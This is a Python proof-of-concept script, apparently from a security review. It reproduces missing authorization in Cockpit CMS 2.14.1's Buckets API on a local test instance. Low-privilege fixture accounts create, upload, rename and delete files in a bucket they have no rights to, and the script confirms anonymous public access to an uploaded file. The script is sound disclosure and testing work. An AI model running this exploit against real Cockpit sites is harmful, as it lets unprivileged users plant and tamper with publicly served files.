#!/usr/bin/env python3
"""CK-001 harness: Buckets API missing authorization.
Prereqs: Cockpit 2.14.1 instance on 127.0.0.1:18080 with fixtures from
live-repro/setup_fixtures.py (users editor1/reader1 with content-only roles).
Control: admin session can use buckets (expected).
Attack: editor1 (role: content/posts read/create/update only) and reader1
(role: content/posts read only) perform ls/createfolder/upload/rename/
removefiles on a bucket neither role has any permission for.
"""
import sys, io, requests
sys.path.insert(0, '../../live-repro')
from ck import *

B = '/system/buckets/api/huntbucket'
ok = True

sa, ca, _ = login('admin', 'AdminPass123!')
r = admin_req(sa, ca, 'POST', B, data={'cmd': 'ls', 'path': ''})
print(f'CONTROL admin ls: HTTP {r.status_code} (expected 200)')
ok &= r.status_code == 200

for user, pw in [('editor1', 'EditorPass123!'), ('reader1', 'ReaderPass123!')]:
    s, c, u = login(user, pw)
    print(f'--- attacker: {user} (role={u["role"]}) ---')
    r = admin_req(s, c, 'POST', B, data={'cmd': 'createfolder', 'path': '', 'name': f'{user}-dir'})
    print(f'ATTACK createfolder: HTTP {r.status_code} {r.text[:80]}')
    ok &= r.status_code == 200 and 'true' in r.text
    files = [('files[]', (f'{user}.txt', io.BytesIO(b'unauthorized upload'), 'text/plain'))]
    r = admin_req(s, c, 'POST', B, data={'cmd': 'upload', 'path': ''}, files=files)
    print(f'ATTACK upload: HTTP {r.status_code} {r.text[:110]}')
    ok &= f'{user}.txt' in r.text
    r = admin_req(s, c, 'POST', B, data={'cmd': 'rename', 'path': f'{user}.txt', 'name': f'{user}-renamed.txt'})
    print(f'ATTACK rename: HTTP {r.status_code} {r.text[:80]}')
    ok &= 'true' in r.text
    r = admin_req(s, c, 'POST', B, data={'cmd': 'removefiles', 'paths[]': f'{user}-renamed.txt'})
    print(f'ATTACK removefiles: HTTP {r.status_code} {r.text[:80]}')
    ok &= 'true' in r.text

# uploaded content is publicly web-accessible (no auth) while it exists:
s, c, u = login('editor1', 'EditorPass123!')
files = [('files[]', ('proof.txt', io.BytesIO(b'ck-001 proof'), 'text/plain'))]
admin_req(s, c, 'POST', B, data={'cmd': 'upload', 'path': ''}, files=files)
r = requests.get(f'{BASE}/storage/uploads/buckets/huntbucket/proof.txt')
print(f'PERSISTED/EXPOSED anonymous fetch of editor-uploaded file: HTTP {r.status_code} body={r.text[:30]!r}')
ok &= r.status_code == 200 and 'ck-001 proof' in r.text
admin_req(s, c, 'POST', B, data={'cmd': 'removefiles', 'paths[]': 'proof.txt'})

print('VERDICT:', 'VULNERABLE - any authenticated role can fully operate buckets' if ok else 'NOT REPRODUCED')
sys.exit(0 if ok else 1)
